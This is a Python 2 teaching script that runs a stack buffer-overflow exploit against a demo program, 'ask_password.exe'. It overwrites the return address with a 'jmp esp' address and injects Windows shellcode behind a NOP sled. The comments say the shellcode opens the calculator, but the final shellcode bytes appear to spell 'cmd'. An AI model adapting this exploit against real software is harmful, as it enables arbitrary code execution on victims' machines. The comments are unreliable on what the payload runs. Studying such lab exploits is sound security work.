import os
import subprocess

''' This script tries a buffer-overflow attack on
    demo executable 'ask_password.exe'

    It uses stack-buffer-overflow to inject code on the executable.
    In this case the code just opens the Windows calculator application

    Author: Alex Porto - Aug/2017
'''
# Creating the content of the buffer that will be used to exploit the stack
# buffer overflow. The exploited function on ask_password.exe puts 2 variables on the stack:
# - INT32 result
# - char [10] buffer

# 12 bytes to fill the buffer
buffer_data = "123456789012"
# 4 bytes to fill the INT variable
int_data = "ABCD"
# EBP is also saved on stack, so we need extra 32 bit to fill it
ebp_data = "1234"
# Next, we change the function return address
# This address lies inside kernel32.dll, and contains "jmp esp" (opcode ff e4)
# This will force the program to jump back to the code we are putting on stack
# This address may change after rebooting, so you may need to run windbg or
# other debugger to find another "jmp esp"
ret_data = "\x25\x8c\xef\x74"
#74 c3 4c f7
ret_data = "\xf7\x4c\xc3\x74"
# Some NOP operands inserted at the beggining of the code, to garantee the
# processor wont jump at the middle of the shellcode when it returns from ret_data
nop_data = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
# Finally, our shell-code
shellcode_data = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" \
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"\
        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"\
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"\
        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"\
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"\
        "\x45\x81\x3e\x43\x72\x65\x61\x75"\
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"\
        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"\
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"\
        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"\
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"\
        "\x6c\x63\x89\xe2\x52\x52\x53\x53"\
        "\x53\x53\x53\x53\x52\x53\xff\xd7"\

shellcode_data = "\x31\xC9" \
		"\x64\x8B\x71\x30"\
		"\x8B\x76\x0C"\
		"\x8B\x76\x1C"\
		"\x8B\x36"\
		"\x8B\x06"\
		"\x8B\x68\x08"\
		"\xEB\x20"\
		"\x5B"\
		"\x53"\
		"\x55"\
		"\x5B"\
		"\x81\xEB\x11\x11\x11\x11"\
		"\x81\xC3\xDA\x3F\x1A\x11"\
		"\xFF\xD3"\
		"\x81\xC3\x11\x11\x11\x11"\
		"\x81\xEB\x8C\xCC\x18\x11"\
		"\xFF\xD3"\
		"\xE8\xDB\xFF\xFF\xFF"\
		"\x63\x6d\x64"


# Create a single string with all above
buffer = buffer_data + int_data + ebp_data + ret_data + nop_data + shellcode_data

# Call ask_password.exe, passing the test password as argument
# and capture the output text
path = os.path.abspath(os.path.dirname(__file__))
exe = os.path.join(path, '..', 'bin', 'ask_password.exe')
p = subprocess.Popen([exe, buffer], shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output, error = p.communicate()

with open('shellcode.bin', 'wb') as f:
    f.write(buffer)

print "Result = ", output, error
print "***************************************"
print "If this worked, you should see the Windows Calculator open on your screen now"
print "Note: If nothing happensm, check if Windows DEC protection is on. It will prevent this exploit from running"

